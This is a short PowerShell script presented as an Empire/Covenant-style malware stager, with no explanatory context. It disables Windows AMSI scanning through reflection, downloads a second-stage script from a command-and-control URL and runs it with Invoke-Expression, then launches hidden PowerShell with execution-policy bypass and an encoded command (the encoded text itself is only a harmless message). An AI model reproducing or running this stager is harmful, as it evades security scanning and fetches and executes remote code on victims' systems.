# =====================================================================
# PowerShell Empire / Covenant Style Stager
# =====================================================================

# Bypass AMSI
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# WebClient Download Cradle
$wc = New-Object System.Net.WebClient
$wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
$payloadUrl = 'https://threat-c2-infrastructure.net/stage2.ps1'
$remoteCode = $wc.DownloadString($payloadUrl)

# Dynamic Execution
Invoke-Expression $remoteCode

# Encoded In-Memory Command
$b64Cmd = 'V3JpdGUtSG9zdCAiTWFsaWNpb3VzIHNjcmlwdCBsb2FkZWQgc3VjY2Vzc2Z1bGx5ISIK'
powershell.exe -ep bypass -w hidden -enc $b64Cmd
